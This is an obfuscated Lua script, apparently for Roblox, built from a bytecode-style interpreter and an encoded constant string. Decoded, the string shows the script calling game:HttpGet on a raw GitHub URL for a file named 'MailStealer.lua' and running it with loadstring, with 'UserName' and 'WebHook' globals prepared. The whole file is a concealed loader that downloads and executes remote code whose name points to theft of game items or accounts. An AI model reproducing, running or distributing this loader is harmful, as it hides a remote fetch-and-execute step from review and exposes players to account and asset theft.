do
	local v0 = tonumber;
	local v1 = string.byte;
	local v2 = string.char;
	local v3 = string.sub;
	local v4 = string.gsub;
	local v5 = string.rep;
	local v6 = table.concat;
	local v7 = table.insert;
	local v8 = math.ldexp;
	local v9 = getfenv or function()
		return _ENV;
	end;
	local v10 = setmetatable;
	local v11 = pcall;
	local v12 = select;
	local v13 = unpack or table.unpack;
	local v14 = tonumber;
	local function v15(v16, v17, ...)
		local v18 = 1;
		local v19;
		v16 = v4(v3(v16, 5), "..", function(v30)
			if (v1(v30, 2) == 79) then
				v19 = v0(v3(v30, 1, 1));
				return "";
			else
				local v68 = v2(v0(v30, 16));
				if v19 then
					local v79 = v5(v68, v19);
					v19 = nil;
					return v79;
				else
					return v68;
				end
			end
		end);
		local function v20(v31, v32, v33)
			if v33 then
				local v69 = (v31 / ((5 - (1 + 2)) ^ (v32 - (2 - (878 - (282 + 595)))))) % (2 ^ (((v33 - ((1638 - (1523 + 114)) - 0)) - (v32 - ((2 + 0) - 1))) + 1));
				return v69 - (v69 % ((883 - 263) - (555 + 64)));
			else
				local v70 = 1065 - (68 + 997);
				local v71;
				while true do
					if (v70 == (931 - (857 + 74))) then
						v71 = 2 ^ (v32 - (569 - (367 + 201)));
						return (((v31 % (v71 + v71)) >= v71) and (928 - (214 + 713))) or (0 + 0);
					end
				end
			end
		end
		local function v21()
			local v34 = v1(v16, v18, v18);
			v18 = v18 + 1;
			return v34;
		end
		local function v22()
			local v35, v36 = v1(v16, v18, v18 + 2);
			v18 = v18 + (1272 - (226 + 1044));
			return (v36 * (1114 - 858)) + v35;
		end
		local function v23()
			local v37 = 117 - (32 + 85);
			local v38;
			local v39;
			local v40;
			local v41;
			while true do
				if (v37 == 1) then
					return (v41 * 16777216) + (v40 * (64226 + 1310)) + (v39 * ((104 - 47) + 199)) + v38;
				end
				if (v37 == (957 - (892 + 65))) then
					v38, v39, v40, v41 = v1(v16, v18, v18 + (7 - 4));
					v18 = v18 + 4;
					v37 = 1 - 0;
				end
			end
		end
		local function v24()
			local v42 = 0;
			local v43;
			local v44;
			local v45;
			local v46;
			local v47;
			local v48;
			while true do
				if (v42 == (353 - (87 + 263))) then
					if (v47 == (180 - (67 + 113))) then
						if (v46 == (0 + (0 - 0))) then
							return v48 * (0 - 0);
						else
							v47 = 1 + 0;
							v45 = 0 - 0;
						end
					elseif (v47 == ((1288 + 1711) - ((1418 - 616) + 150))) then
						return ((v46 == (0 - 0)) and (v48 * ((1 - 0) / 0))) or (v48 * NaN);
					end
					return v8(v48, v47 - ((1183 - (145 + 293)) + 278)) * (v45 + (v46 / (((1429 - (44 + 386)) - (915 + 82)) ^ (147 - 95))));
				end
				if (v42 == (0 + 0)) then
					v43 = v23();
					v44 = v23();
					v42 = 1 - 0;
				end
				if (v42 == 2) then
					v47 = v20(v44, (2694 - (998 + 488)) - (1069 + 118), 70 - 39);
					v48 = ((v20(v44, 69 - 37) == 1) and -(1 + 0)) or (1 - 0);
					v42 = 3 + 0;
				end
				if (v42 == ((252 + 540) - (368 + 347 + 76))) then
					v45 = (775 - (201 + 571)) - 2;
					v46 = (v20(v44, 19 - (10 + 8), 76 - 56) * ((1140 - (116 + 1022)) ^ ((1973 - 1499) - (416 + 26)))) + v43;
					v42 = 2;
				end
			end
		end
		local function v25(v49)
			local v50;
			if not v49 then
				v49 = v23();
				if (v49 == (0 - 0)) then
					return "";
				end
			end
			v50 = v3(v16, v18, (v18 + v49) - (1 + 0));
			v18 = v18 + v49;
			local v51 = {};
			for v66 = 3 - 2, #v50 do
				v51[v66] = v2(v1(v3(v50, v66, v66)));
			end
			return v6(v51);
		end
		local v26 = v23;
		local function v27(...)
			return {...}, v12("#", ...);
		end
		local function v28()
			local v52 = 0 - 0;
			local v53;
			local v54;
			local v55;
			local v56;
			local v57;
			local v58;
			while true do
				if (v52 == (1207 - (696 + 510))) then
					local v72 = 0;
					local v73;
					while true do
						if (v72 ~= 0) then
						else
							v73 = 0 - 0;
							while true do
								if (v73 == (1264 - (1091 + 171))) then
									v52 = 2;
									break;
								end
								if (v73 == 1) then
									for v105 = 1, v57 do
										local v106 = 0;
										local v107;
										local v108;
										local v109;
										while true do
											if (v106 ~= (0 + 0)) then
											else
												v107 = 0 - 0;
												v108 = nil;
												v106 = 3 - 2;
											end
											if (1 == v106) then
												v109 = nil;
												while true do
													if (v107 == (375 - (123 + 251))) then
														if (v108 == (4 - 3)) then
															v109 = v21() ~= 0;
														elseif (v108 == 2) then
															v109 = v24();
														elseif (v108 == (701 - (208 + 490))) then
															v109 = v25();
														end
														v58[v105] = v109;
														break;
													end
													if (v107 == 0) then
														v108 = v21();
														v109 = nil;
														v107 = 1;
													end
												end
												break;
											end
										end
									end
									v56[3] = v21();
									v73 = 1 + 1;
								end
								if (v73 == 0) then
									v57 = v23();
									v58 = {};
									v73 = 1;
								end
							end
							break;
						end
					end
				end
				if (2 ~= v52) then
				else
					local v74 = 0;
					while true do
						local v80 = 0 + 0;
						while true do
							if (v80 == 0) then
								if (0 ~= v74) then
								else
									local v104 = 0;
									while true do
										if (v104 == 1) then
											v74 = 837 - (660 + 176);
											break;
										end
										if (v104 ~= (0 + 0)) then
										else
											for v110 = 1, v23() do
												local v111 = 202 - (14 + 188);
												local v112;
												local v113;
												local v114;
												local v115;
												while true do
													if (v111 ~= (677 - (534 + 141))) then
													else
														while true do
															if (v112 ~= (0 + 0)) then
															else
																v113 = 0 + 0;
																v114 = nil;
																v112 = 1 + 0;
															end
															if (v112 == 1) then
																v115 = nil;
																while true do
																	if (v113 == (0 - 0)) then
																		v114 = 0;
																		v115 = nil;
																		v113 = 1 - 0;
																	end
																	if (1 == v113) then
																		while true do
																			if (v114 ~= (0 - 0)) then
																			else
																				v115 = v21();
																				if (v20(v115, 1 + 0, 1 + 0) == 0) then
																					local v166 = 0;
																					local v167;
																					local v168;
																					local v169;
																					local v170;
																					while true do
																						if (1 == v166) then
																							v169 = nil;
																							v170 = nil;
																							v166 = 2;
																						end
																						if (v166 ~= 2) then
																						else
																							while true do
																								if (v167 == (397 - (115 + 281))) then
																									local v171 = 0 - 0;
																									while true do
																										if (1 ~= v171) then
																										else
																											v167 = 2;
																											break;
																										end
																										if ((0 + 0) == v171) then
																											v170 = {v22(),v22(),nil,nil};
																											if (v168 == (0 - 0)) then
																												local v180 = 867 - (550 + 317);
																												local v181;
																												local v182;
																												while true do
																													if (v180 ~= (0 - 0)) then
																													else
																														v181 = 0 - 0;
																														v182 = nil;
																														v180 = 1;
																													end
																													if (v180 == 1) then
																														while true do
																															if ((0 - 0) ~= v181) then
																															else
																																v182 = 285 - (134 + 151);
																																while true do
																																	if (v182 ~= 0) then
																																	else
																																		v170[3] = v22();
																																		v170[4] = v22();
																																		break;
																																	end
																																end
																																break;
																															end
																														end
																														break;
																													end
																												end
																											elseif (v168 == (1666 - (970 + 695))) then
																												v170[5 - 2] = v23();
																											elseif (v168 == (1992 - (582 + 1408))) then
																												v170[10 - 7] = v23() - ((2 - 0) ^ (60 - 44));
																											elseif (v168 == (1827 - (1195 + 629))) then
																												local v185 = 0;
																												local v186;
																												while true do
																													if (v185 == 0) then
																														v186 = 0 - 0;
																														while true do
																															if (v186 == (241 - (187 + 54))) then
																																v170[3] = v23() - (2 ^ 16);
																																v170[4] = v22();
																																break;
																															end
																														end
																														break;
																													end
																												end
																											end
																											v171 = 1;
																										end
																									end
																								end
																								if (v167 ~= 0) then
																								else
																									local v172 = 0;
																									while true do
																										if (v172 == (781 - (162 + 618))) then
																											v167 = 1;
																											break;
																										end
																										if (v172 == (0 + 0)) then
																											v168 = v20(v115, 2, 3);
																											v169 = v20(v115, 4, 4 + 2);
																											v172 = 1 - 0;
																										end
																									end
																								end
																								if (2 == v167) then
																									if (v20(v169, 1 - 0, 1 + 0) ~= (1637 - (1373 + 263))) then
																									else
																										v170[2] = v58[v170[2]];
																									end
																									if (v20(v169, 1002 - (451 + 549), 2) == (1 + 0)) then
																										v170[3] = v58[v170[4 - 1]];
																									end
																									v167 = 3;
																								end
																								if (v167 == (4 - 1)) then
																									if (v20(v169, 1387 - (746 + 638), 2 + 1) == (1 - 0)) then
																										v170[4] = v58[v170[4]];
																									end
																									v53[v110] = v170;
																									break;
																								end
																							end
																							break;
																						end
																						if (v166 == 0) then
																							v167 = 0;
																							v168 = nil;
																							v166 = 342 - (218 + 123);
																						end
																					end
																				end
																				break;
																			end
																		end
																		break;
																	end
																end
																break;
															end
														end
														break;
													end
													if (v111 ~= 1) then
													else
														v114 = nil;
														v115 = nil;
														v111 = 1583 - (1535 + 46);
													end
													if (v111 ~= (0 + 0)) then
													else
														v112 = 0;
														v113 = nil;
														v111 = 1;
													end
												end
											end
											for v116 = 1 + 0, v23() do
												v54[v116 - (561 - (306 + 254))] = v28();
											end
											v104 = 1 + 0;
										end
									end
								end
								if (v74 == (1 - 0)) then
									return v56;
								end
								break;
							end
						end
					end
				end
				if (v52 == 0) then
					local v75 = 1467 - (899 + 568);
					while true do
						if (v75 == 1) then
							v55 = {};
							v56 = {v53,v54,nil,v55};
							v75 = 2;
						end
						if (v75 ~= (572 - (426 + 146))) then
						else
							v53 = {};
							v54 = {};
							v75 = 1;
						end
						if ((1 + 1) ~= v75) then
						else
							v52 = 1457 - (282 + 1174);
							break;
						end
					end
				end
			end
		end
		local function v29(v59, v60, v61)
			local v62 = 0;
			local v63;
			local v64;
			local v65;
			while true do
				if (v62 == 1) then
					v65 = v59[3];
					return function(...)
						local v81 = v63;
						local v82 = v64;
						local v83 = v65;
						local v84 = v27;
						local v85 = 1;
						local v86 = -1;
						local v87 = {};
						local v88 = {...};
						local v89 = v12("#", ...) - 1;
						local v90 = {};
						local v91 = {};
						for v95 = 0, v89 do
							if (v95 >= v83) then
								v87[v95 - v83] = v88[v95 + 1];
							else
								v91[v95] = v88[v95 + 1];
							end
						end
						local v92 = (v89 - v83) + 1;
						local v93;
						local v94;
						while true do
							local v96 = 0;
							while true do
								if (1 == v96) then
									if (v94 <= 10) then
										if (v94 <= 4) then
											if (v94 <= 1) then
												if (v94 == 0) then
													v85 = v93[3];
												else
													do
														return;
													end
												end
											elseif (v94 <= 2) then
												if (v91[v93[2]] == v93[4]) then
													v85 = v85 + 1;
												else
													v85 = v93[3];
												end
											elseif (v94 == 3) then
												v91[v93[2]] = v61[v93[3]];
											elseif (v91[v93[2]] == v93[4]) then
												v85 = v85 + 1;
											else
												v85 = v93[3];
											end
										elseif (v94 <= 7) then
											if (v94 <= 5) then
												v91[v93[2]] = v93[3];
											elseif (v94 > 6) then
												v91[v93[2]]();
											else
												local v133 = v93[2];
												local v134, v135 = v84(v91[v133](v13(v91, v133 + 1, v93[3])));
												v86 = (v135 + v133) - 1;
												local v136 = 0;
												for v158 = v133, v86 do
													local v159 = 0;
													while true do
														if (v159 == 0) then
															v136 = v136 + 1;
															v91[v158] = v134[v136];
															break;
														end
													end
												end
											end
										elseif (v94 <= 8) then
											local v122 = v93[2];
											v91[v122] = v91[v122](v13(v91, v122 + 1, v86));
										elseif (v94 == 9) then
											local v137 = v93[2];
											v91[v137] = v91[v137](v13(v91, v137 + 1, v86));
										else
											v91[v93[2]] = v61[v93[3]];
										end
									elseif (v94 <= 15) then
										if (v94 <= 12) then
											if (v94 == 11) then
												v91[v93[2]] = v93[3] ~= 0;
											else
												v85 = v93[3];
											end
										elseif (v94 <= 13) then
											v61[v93[3]] = v91[v93[2]];
										elseif (v94 == 14) then
											v91[v93[2]]();
										else
											local v141 = v93[2];
											local v142, v143 = v84(v91[v141](v13(v91, v141 + 1, v93[3])));
											v86 = (v143 + v141) - 1;
											local v144 = 0;
											for v160 = v141, v86 do
												v144 = v144 + 1;
												v91[v160] = v142[v144];
											end
										end
									elseif (v94 <= 18) then
										if (v94 <= 16) then
											do
												return;
											end
										elseif (v94 > 17) then
											v61[v93[3]] = v91[v93[2]];
										else
											local v147 = v93[2];
											local v148 = v91[v93[3]];
											v91[v147 + 1] = v148;
											v91[v147] = v148[v93[4]];
										end
									elseif (v94 <= 19) then
										v91[v93[2]] = v93[3];
									elseif (v94 > 20) then
										local v152 = v93[2];
										local v153 = v91[v93[3]];
										v91[v152 + 1] = v153;
										v91[v152] = v153[v93[4]];
									else
										v91[v93[2]] = v93[3] ~= 0;
									end
									v85 = v85 + 1;
									break;
								end
								if (v96 == 0) then
									v93 = v81[v85];
									v94 = v93[1];
									v96 = 1;
								end
							end
						end
					end;
				end
				if (v62 == 0) then
					v63 = v59[1];
					v64 = v59[2];
					v62 = 1;
				end
			end
		end
		return v29(v28(), {}, v17)(...);
	end
	v15("LOL!093O00028O00026O00F03F030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403503O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F426573744875625242582F4D61696C537465616C65724E65772F6D61696E2F4D61696C537465616C65722E6C756103083O00557365724E616D65034O0003073O00576562482O6F6B00153O0012133O00013O0026023O000C0001000200044O000C0001001203000100033O001203000200043O002011000200020005001213000400064O0014000500014O0006000200054O000900013O00022O000700010001000100044O001400010026023O00010001000100044O00010001001213000100083O00120D000100073O001213000100083O00120D000100093O0012133O00023O00044O000100012O00103O00017O00", v9(), ...);
end
